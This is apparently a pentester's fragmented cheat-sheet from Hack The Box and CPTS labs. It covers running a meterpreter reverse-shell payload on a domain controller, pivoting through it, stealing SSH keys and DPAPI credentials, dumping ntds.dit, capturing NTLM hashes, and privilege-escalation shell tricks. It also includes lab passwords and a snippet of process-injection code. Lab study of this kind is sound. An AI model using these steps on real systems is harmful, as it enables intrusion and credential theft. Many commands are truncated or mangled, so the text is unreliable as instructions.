Subsequently, students need to use the `Evil-WinRM` session established with the target DC to upload the `meterpreter payload` just created (noticing that the home directory of `Pwnbox` might be different for each user,

```
upload "/home/htb-ac413848/dc_shell.exe"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--4
#cat/UTILS #cpts
Students now need to execute the generated `msfvenom` reverse TCP payload that was copied over into `DC01` to notice that a new `meterpreter` session has started:

```
.\dc_shell.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--5
#cat/UTILS #cpts
```
(Meterpreter 1)(C:\Users\Administrator\Documents) >
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--6
#cat/UTILS #cpts
On the `meterpreter` session, students need to use `autoroute` to add a route to the `172.16.9.0/23` network so that `Pwnbox`/`PMVPN` can reach hosts on that network through `MSF`:

```
run autoroute -s 172.16.9.0/23
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--7
#cat/UTILS #cpts
```
(Meterpreter 1)(C:\Users\Administrator\Documents) > run autoroute -s 172.16.9.0/23
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--8
#cat/UTILS #cpts
Thereafter, students need to background the current `meterpreter` session and configure the `SOCKS` proxy server:

```
set SRVPORT 9050
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--9
#cat/UTILS #cpts
Thereafter, students need to background the current `meterpreter` session and configure the `SOCKS` proxy server:

```
set VERSION 4a
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--10
#cat/UTILS #cpts
```
(Meterpreter 1)(C:\Users\Administrator\Documents) > bg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - gain-access-to-the-mgmt01-host-and-submit-the-contents-of-the-flagtxt--11
#cat/UTILS #cpts
Now that the host is reachable, students need to enumerate `DC01`, which they connected to using `Evil-WinRM`, to discover that the SSH private key of the user `ssmallsadm` can be found under the directory `C:\Department

```
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" ./ssmallsadmKey
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-privileges-to-root-on-the-mgmt01-host-submit-the-contents-of-
#cat/UTILS #cpts
To use the exploit, students need to find a `SUID`executable, for which they can use the command `find`:

```
find / -perm -4000 2>/dev/null
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-a-unc-path
#cat/UTILS #cpts
```
\\SERVER\Share\file.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - m3u-m3u8-media-playlist
#cat/UTILS #cpts
```
\\10.10.14.5\share\anything
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - url-shortcut
#cat/UTILS #cpts
```
[InternetShortcut]
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - step-4-capture-the-hash
#cat/UTILS #cpts
Save the full hash line to a file:

```
echo "username::DOMAIN:1122...<hash>" > captured.hash
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - how-ntlmv2-works-quick-reference
#cat/UTILS #cpts
```
1. Client → Server : Authentication request
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - streamio
#cat/UTILS #cpts
- Web enumeration - LFI using PHP wrappers - Source Code Review - Detecting and exploiting remote file inclusion - Browser saved credentials retrieval and cracking - Automatic LDAP enumeration for lateral movement - LDAP

```
James
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - post-scan
#cat/UTILS #cpts
```
poetry run kb-inject -j 'C:\Users\rdo\Documents\tools\TESTPRESTATIONS\prestaRDOTEST\result.json' -i 'C:\Users\rdo\Documents\tools\TESTPRESTATIONS\prestaRDOTEST\' -l FR
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - git
#cat/UTILS #cpts
With a local repos

```
git log
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - git-2
#cat/UTILS #cpts
With a local repos

```
git diff {id}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - craft-taff
#cat/UTILS #cpts
- Python eval injection - Git - pymysql API - Vault SSH dinesh:4aUh0A8PbVJxgd ebachman:llJ77D8QFkLPQB gilfoyle:ZEU3N8WNM2rh4T CRAFT API SECRET = 'hz660CkDtv8G6D' MYSQL DATABASE USER = 'craft' MYSQL DATABASE PASSWORD = 'q

```
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615
#cat/UTILS #cpts
Flag récupéré

```
111/tcp open rpcbind 2-4 (RPC #100000) - INTERACTION NOT ALLOWED
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615-2
#cat/UTILS #cpts
INTERACTION NON AUTORISE

```
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615-3
#cat/UTILS #cpts
INTERACTION NON AUTORISE

```
1433/tcp open ms-sql-s Microsoft SQL Server 2019
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615-4
#cat/UTILS #cpts
bruteforce sans succès

```
2049/tcp open mountd 1-3 (RPC #100005)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615-5
#cat/UTILS #cpts
VIDE

```
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615-6
#cat/UTILS #cpts
```
49664/tcp open msrpc Microsoft Windows RPC
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615-7
#cat/UTILS #cpts
```
49673/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - dante-dante-sql01-1721615-8
#cat/UTILS #cpts
bruteforce sans succès

```
49677/tcp open msrpc Microsoft Windows RPC
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - fluffy
#cat/UTILS #cpts
extrait du PDF Joplin: fluffy

```
cd CVE-2025-24071_PoC
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - fluffy-2
#cat/UTILS #cpts
extrait du PDF Joplin: fluffy

```
cat hash p.agila::FLUFFY:208d2c2f1ea8dab7:EDA98E265A7A054A8EF2812F9FBB8FE67000000000000000000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vulncicada
#cat/UTILS #cpts
extrait du PDF Joplin: vulncicada

```
ls /mnt Administrator Daniel.Marshall Debra.Wright Jane.Carter Jordan.Francis Joyce.Andrews Katie.Ward Megan.Simpson Richard.Gibbons Rosie.Powell Shirley.West
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vulncicada-2
#cat/UTILS #cpts
extrait du PDF Joplin: vulncicada

```
sudo cp /mnt/Rosie.Powell/marketing.png .
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
use IT
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-2
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd Second-Line Support
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-3
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd Archived Users
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-4
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd todd.wolfe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-5
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
ls drw-rw-rw- 0 Wed Jan 29 10 :13:16 2025. drw-rw-rw- 0 Wed Jan 29 10 :13:06 2025.. drw-rw-rw- 0 Wed Jan 29 10 :13:06 2025 3D Objects drw-rw-rw- 0 Wed Jan 29 10 :13:09 2025 AppData drw-rw-rw- 0 Wed Jan 29 10 :13:10 2025 Contacts drw-rw-rw- 0 Thu Jan 30 09 :28:50 2025 Desktop drw-rw-rw- 0 Wed Jan 29 10 :13:10 2025 Documents drw-rw-rw- 0 Wed Jan 29 10 :13:10 2025 Downloads drw-rw-rw- 0 Wed Jan 29 10 :13:10 2025 Favorites
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-6
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd AppData\Roaming\Microsoft\Credentials
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-7
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
ls drw-rw-rw- 0 Wed Jan 29 10 :13:09 2025. drw-rw-rw- 0 Wed Jan 29 10 :13:09 2025.. -rw-rw-rw- 398 Wed Jan 29 08 :13:50 2025 772275FAD58525253490A9B0039791D3
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-8
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd protect
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-9
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd S-1-5-21-3927696377-1337352550-2781715495-1110
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-10
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
ls drw-rw-rw- 0 Wed Jan 29 10 :13:09 2025. drw-rw-rw- 0 Wed Jan 29 10 :13:09 2025.. -rw-rw-rw- 740 Wed Jan 29 08 :09:25 2025 08949382 -134f-4c63-b93c-ce52efc0aa88 -rw-rw-rw- 900 Wed Jan 29 07 :53:08 2025 BK-VOLEUR -rw-rw-rw- 24 Wed Jan 29 07 :53:08 2025 Preferred
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-11
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
pwd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-12
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
get 772275FAD58525253490A9B0039791D3
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-13
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
ls -la total 0 drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025. dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 2025.. drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025 'Active Directory' drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025 registry :/mnt/c/IT/Third-Line Support/Backups
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-14
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
ls -la total 17952 drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025. drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025.. -rwxrwxrwx 1 svc_backup svc_backup 32768 Jan 30 2025 SECURITY -rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 2025 SYSTEM :/mnt/c/IT/Third-Line Support/Backups/Registry
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-15
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd .. :/mnt/c/IT/Third-Line Support/Backups
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-16
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
cd Active\n Directory/ :/mnt/c/IT/Third-Line Support/Backups/Active Directory
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - voleur-17
#cat/UTILS #cpts
extrait du PDF Joplin: voleur

```
ls -la total 24592 drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025. drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 2025.. -rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 2025 ntds.dit -rwxrwxrwx 1 svc_backup svc_backup 16384 Jan 30 2025 ntds.jfm :/mnt/c/IT/Third-Line Support/Backups/Active Directory
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escapetwo
#cat/UTILS #cpts
extrait du PDF Joplin: escapetwo

```
shares Accounting Department
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escapetwo-2
#cat/UTILS #cpts
extrait du PDF Joplin: escapetwo

```
use Accounting Department
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escapetwo-3
#cat/UTILS #cpts
extrait du PDF Joplin: escapetwo

```
ls -rw-rw-rw- 10217 Sun Jun 9 07:11:31 2024 accounting_2024.xlsx -rw-rw-rw- 6780 Sun Jun 9 07:11:31 2024 accounts.xlsx
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escapetwo-4
#cat/UTILS #cpts
extrait du PDF Joplin: escapetwo

```
get accounting_2024.xlsx
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - freelancer
#cat/UTILS #cpts
extrait du PDF Joplin: freelancer

```
sudo ./memprocfs -device ../MEMORY.DMP -mount /mnt/memprocfs -forensic 0 Initialized 64-bit Windows 10.0.17763 ============================== MemProcFS ============================== - Author: Ulf Frisk
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - freelancer-2
#cat/UTILS #cpts
extrait du PDF Joplin: freelancer

```
smbpasswd.py freelancer.htb/liza.kazanof:'RockYou!'@freelancer.htb -newpass 'Passw0rd!'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - analysis
#cat/UTILS #cpts
extrait du PDF Joplin: analysis

```
type password . txt roguetest #include stdio.h #include windows.h #include tlhelp32.h #include stdint.h FARPROC WCTMBAddress ; DWORD textEncodeProcessId ; HANDLE textEncodeProcess ; FARPROC HWCTMBAddress ; FARPROC GetWCTMBAddress () { HMODULE hKernel32 ; FARPROC WCTMBAddress ; hKernel32 = GetModuleHandleA ( "kernel32.dll" ); if ( hKernel32 == NULL ) { printf ( "[X] Failed to load kernel32.dll" ); exit ( - 1 ); } WCTMBAddress = GetProcAddress ( hKernel32 , "WideCharToMultiByte" ); if ( WCTMBAddress == NULL ) { printf ( "[X] Failed to retrieve WideCharToMultiByte address" ); exit ( - 1 )
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - carpediem
#cat/UTILS #cpts
extrait du PDF Joplin: carpediem

```
create cmd touch $cmdPath echo '#!/bin/sh'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pandora
#cat/UTILS #cpts
extrait du PDF Joplin: pandora

```
echo "/bin/sh < $(tty)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pandora-2
#cat/UTILS #cpts
extrait du PDF Joplin: pandora

```
$(tty) 2> $(tty) " | at now; tail -f /dev/null
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pandora-3
#cat/UTILS #cpts
extrait du PDF Joplin: pandora

```
export PATH = /tmp: $PATH
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - napper
#cat/UTILS #cpts
extrait du PDF Joplin: napper

```
cd C:\\Temp\\www\\internal\\content\\posts\\internal-laps-alpha meterpreter
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - napper-2
#cat/UTILS #cpts
extrait du PDF Joplin: napper

```
getuid Server username: NAPPER\backup
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - napper-3
#cat/UTILS #cpts
extrait du PDF Joplin: napper

```
getuid Server username: NT AUTHORITY\SYSTEM
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - intelligence
#cat/UTILS #cpts
extrait du PDF Joplin: intelligence

```
Download </ a
```

